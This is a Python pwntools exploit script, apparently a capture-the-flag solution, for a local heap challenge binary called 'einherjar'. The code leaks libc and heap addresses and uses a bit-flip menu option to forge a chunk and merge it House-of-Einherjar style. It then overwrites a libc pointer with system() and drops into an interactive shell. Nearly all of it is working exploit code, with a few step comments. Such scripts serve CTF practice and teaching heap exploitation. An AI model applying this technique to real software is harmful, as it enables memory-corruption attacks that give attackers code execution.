from pwn import *

k = process("./einherjar")
elf = ELF("./einherjar")
def add(size,idx):
	k.sendafter(">> ",str(1))
	k.sendafter("Enter size of input\n",str(size))
	k.sendafter("Enter index\n",str(idx))

def free(idx):
	k.sendafter(">> ",str(2))
	k.sendafter("Enter index",str(idx))

def edit(idx,cont):
	k.sendafter(">> ",str(3))
	k.sendafter("Enter index",str(idx))
	k.send(str(cont))

def view():
	k.sendafter(">> ",str(4))
	#TBM

def flip(addr):
	k.sendafter(">> ",str(1337))
	k.sendafter("Address : ",str(addr))
	#TBM

def change_author(auth):
	k.sendafter(">> ",str(5))
	k.sendline(str(auth))


add(0x20,0)
add(0x100,1)
add(0x20,2)
add(0x20,3)
add(0xf0,4)
add(0x20,5)
#add(0x300,7)
free(1)
free(3)
free(5)


#add(0x300,7)
add(0x100,1)
view()
k.recvline()

main_arena = u64(k.recvline().split(" => ")[1].strip().ljust(8,"\x00"))
libc_base = main_arena - 0x3c4b78
system = libc_base + 0x45390

add(0x20,5)
view()
for i in range(4):
	print(k.recvline())
heap_leak = u64(k.recvline().split(" => ")[1].strip().ljust(8,"\x00"))
heap_base = heap_leak - 0x270
print(hex(heap_base),hex(libc_base))


print("merge")
change_author("AAAAAAAAAAAAAAAAAAAAAAAAAAA")
author = p64(heap_base + 0x10)
fake_size = 0x100
#payload = p64(0x100)+p64(0x100)+author+author+author+author
#change_author(payload) #fake_chunk 

add(0x38,6)
add(0xf0,7)

chunk_6 = heap_base + 0x3e0-0x10
chunk_7 = heap_base + 0x420-0x10
#size = 
prev_size = chunk_7 - u64(author)
print("merge")
change_author("AAAAAAAAAAAAAAAAAAAAAAAAAAA")
author = p64(heap_base + 0x10)
fake_size = 0x100
payload = p64(prev_size)+p64(prev_size)+author+author+author+author
change_author(payload)

flip(heap_base+ 0xf8) #flipping the size of 6th chunk

edit(6,"a"*48+p64(prev_size))
gdb.attach(k)

flip( chunk_7+0x8)
 #merged the two chunks

system = p64(libc_base + 0x45390)
#system = p64(libc_base+0xf1117)
print(hex(u64(system)))

#trial = libc_base + 0x3c4b10
trial = libc_base + 0x3c67a8
op = libc_base + 0x18cd57

free(7)
add(0x70,3)
edit(3,"b"*0x50+p64(0)+p64(0x61)+p64(trial)+p64(op))
edit(0,system)

free(1)

#
#add(6,"/bin//sh")
#free(6)


gdb.attach(k)
k.interactive()
#merging of two chunks so as to get a UAF (predict the addr)
#make fd and bk point to the chunk so that it can pass the unlink check
#modify it's fd pointer so as to get the next allocation
#once you get your chunk allocated at the right place overwrite with system
'''add(0xf0,3)
#	chunk_4 = 
flip(chunk_4+0x8) #flipping prev_in_use
flip(heap_base+0xe8) #flipping size field so as to get one-byte overflow
#flip(heap_base+	0x278)
chunk_3 = heap_base + 0x280
edit(3,p64(chunk_3)+p64(chunk_3)+p64(chunk_3)+p64(chunk_3)+'a'*16+chr(0x30))




add(0x100,2)

view()'''

